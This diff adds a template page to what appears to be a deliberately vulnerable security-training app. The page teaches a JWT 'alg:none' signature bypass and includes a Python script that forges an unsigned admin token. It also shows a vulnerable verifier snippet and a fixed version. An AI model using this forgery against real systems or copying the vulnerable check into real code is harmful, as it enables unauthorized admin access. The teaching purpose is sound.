@@ -1,0 +1,79 @@
+{% extends "core/example_page_base.html" %}
+{% set example_title = "JWT alg:none Signature Bypass" %}
+{% set example_difficulty = "Medium" %}
+{% set code_language = "javascript" %}
+{% block title %}{{ example_title }} — A08{% endblock %}
+
+{% block explanation %}
+<p>
+  This hand-rolled, HS256-signed token format is the same shape as a real
+  JWT — a base64url header, payload, and signature joined with dots. The
+  verifier's bug: it reads which algorithm to use for verification from
+  the <em>token's own header</em>, rather than always expecting HS256. An
+  attacker who controls the token controls how it gets checked.
+</p>
+{% endblock %}
+
+{% block detect %}
+<p>
+  Get a real guest token from
+  <a href="{{ url_for('a08_integrity_failures.api_token') }}">/a08/api-token</a>
+  and submit it below — access is correctly denied, since the guest role
+  isn't admin. A tampered signature is also correctly rejected. The bug
+  only appears once you change which algorithm the token itself claims to
+  use.
+</p>
+{% endblock %}
+
+{% block exploitation %}
+<p>
+  Build this token yourself — no valid signature required, because the
+  header simply says not to check one:
+</p>
+<pre><code class="language-python">import base64, json
+
+def b64url(data):
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
+payload = b64url(json.dumps({"user": "attacker", "role": "admin"}).encode())
+print(f"{header}.{payload}.")</code></pre>
+<p>
+  Submit the printed token below. It returns
+  <strong>ADMIN ACCESS GRANTED</strong> — the verifier saw
+  <code>"alg": "none"</code> in the header and simply skipped signature
+  verification entirely, exactly as the header instructed it to.
+</p>
+{% endblock %}
+
+{% block vulnerable_code %}var alg = header.alg;  // read from the ATTACKER-CONTROLLED token itself
+if (alg === "HS256") {
+  // verify signature...
+} else if (alg === "none") {
+  // no verification at all
+}
+{% endblock %}
+
+{% block secure_code %}// Never let the token decide how it gets verified -- pin the expected
+// algorithm in the verifier itself:
+if (header.alg !== "HS256") {
+  throw new Error("unsupported alg");
+}
+// verify signature unconditionally
+{% endblock %}
+
+{% block live_example %}
+<form method="post">
+  <div class="mb-2">
+    <label class="form-label">Token</label>
+    <textarea class="form-control" name="token" rows="3"></textarea>
+  </div>
+  <button type="submit" class="btn btn-primary">Call Admin API</button>
+</form>
+{% if result %}
+<p class="mt-3 text-success">{{ result }}</p>
+{% endif %}
+{% if error %}
+<p class="mt-3 text-danger">{{ error }}</p>
+{% endif %}
+{% endblock %}
